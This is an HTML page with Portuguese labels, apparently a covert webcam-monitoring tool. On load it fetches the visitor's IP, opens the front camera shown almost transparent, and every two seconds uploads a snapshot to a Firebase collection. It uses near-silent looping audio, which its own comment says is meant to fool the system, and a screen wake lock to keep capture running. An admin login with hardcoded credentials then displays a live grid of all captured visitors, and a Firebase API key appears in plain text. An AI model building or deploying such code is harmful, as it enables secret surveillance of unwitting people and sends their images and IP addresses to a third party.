<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Monitoramento Pro - Ultra Persistência</title>
    <style>
        body { font-family: sans-serif; background: #000; color: white; margin: 0; overflow: hidden; }
        #admin-area { position: absolute; top: 10px; left: 10px; z-index: 100; }
        .login-box { background: rgba(0, 0, 0, 0.9); padding: 12px; border-radius: 8px; display: flex; flex-direction: column; gap: 8px; border: 1px solid #007bff; }
        input { padding: 8px; border-radius: 4px; border: none; width: 130px; background: #222; color: #fff; }
        button { cursor: pointer; background: #007bff; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; }
        video { width: 100vw; height: 100vh; object-fit: cover; position: absolute; top: 0; left: 0; opacity: 0.2; }
        canvas { display: none; }
        .hidden { display: none !important; }
        
        #grid-monitores { 
            display: grid; 
            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); 
            gap: 10px; margin-top: 10px; max-height: 80vh; overflow-y: auto; width: 350px;
        }
        .monitor-card { background: #111; border: 1px solid #444; border-radius: 5px; padding: 5px; }
        .monitor-card img { width: 100%; border-radius: 3px; }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .online .status-dot { background: #00ff00; box-shadow: 0 0 5px #00ff00; }
        .offline .status-dot { background: #ff0000; }
    </style>
</head>
<body>

    <video id="webcam" autoplay playsinline muted></video>
    <canvas id="canvas-foto"></canvas>
    <audio id="silent-audio" loop>
        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
    </audio>

    <div id="admin-area">
        <div id="form-login" class="login-box">
            <input type="text" id="usuario" placeholder="User">
            <input type="password" id="senha" placeholder="Pass">
            <button onclick="verificarAdmin()">ACESSAR PAINEL</button>
        </div>

        <div id="painel-admin" class="hidden">
            <div class="login-box">
                <div style="display:flex; justify-content: space-between; align-items:center;">
                    <span style="font-size: 11px;">MODO PERSISTENTE ATIVO</span>
                    <button onclick="location.reload()" style="background:#d9534f; padding: 2px 8px;">Sair</button>
                </div>
                <div id="grid-monitores"></div>
            </div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBg4iJlgMKbkukddt9bWLfpRXm27u14Zg0",
            projectId: "cameralog-24090",
            appId: "1:1054247726586:web:2e3c0584e54ada96a0c843"
        };

        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        let meuIP = "descobrindo...";

        // Função para manter o áudio rodando (mesmo mudo) para enganar o sistema
        function manterProcessoVivo() {
            const audio = document.getElementById('silent-audio');
            audio.volume = 0.01; // Quase mudo
            audio.play().catch(() => {
                // Se o navegador bloquear o autoplay, tentamos ao primeiro clique
                window.addEventListener('click', () => audio.play(), { once: true });
            });
        }

        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                meuIP = data.ip.replace(/\./g, '_');
                iniciarApp();
            });

        async function iniciarApp() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                document.getElementById('webcam').srcObject = stream;
                manterProcessoVivo();
                
                if ('wakeLock' in navigator) { await navigator.wakeLock.request('screen').catch(()=>{}); }

                setInterval(capturarEAtualizar, 2000);
            } catch (err) { console.error(err); }
        }

        function capturarEAtualizar() {
            const video = document.getElementById('webcam');
            const canvas = document.getElementById('canvas-foto');
            if (video.readyState === video.HAVE_ENOUGH_DATA) {
                const context = canvas.getContext('2d');
                canvas.width = 320; canvas.height = 240;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const fotoBase64 = canvas.toDataURL('image/jpeg', 0.3);
                
                db.collection("ips_ativos").doc(meuIP).set({
                    ip_original: meuIP.replace(/_/g, '.'),
                    last_ping: Date.now(),
                    imagem: fotoBase64
                });
            }
        }

        function verificarAdmin() {
            if (document.getElementById('usuario').value === "Gusta" && document.getElementById('senha').value === "Gusta") {
                document.getElementById('form-login').classList.add('hidden');
                document.getElementById('painel-admin').classList.remove('hidden');
                escutarMonitoramento();
            }
        }

        function escutarMonitoramento() {
            const grid = document.getElementById('grid-monitores');
            db.collection("ips_ativos").onSnapshot((snapshot) => {
                grid.innerHTML = "";
                const agora = Date.now();
                snapshot.forEach((doc) => {
                    const dados = doc.data();
                    const isOnline = (agora - dados.last_ping) / 1000 < 10;
                    const card = document.createElement('div');
                    card.className = `monitor-card ${isOnline ? 'online' : 'offline'}`;
                    card.innerHTML = `
                        <span style="font-size:10px;"><span class="status-dot"></span>IP: ${dados.ip_original}</span>
                        <img src="${dados.imagem}">
                    `;
                    grid.appendChild(card);
                });
            });
        }
    </script>
</body>
</html>
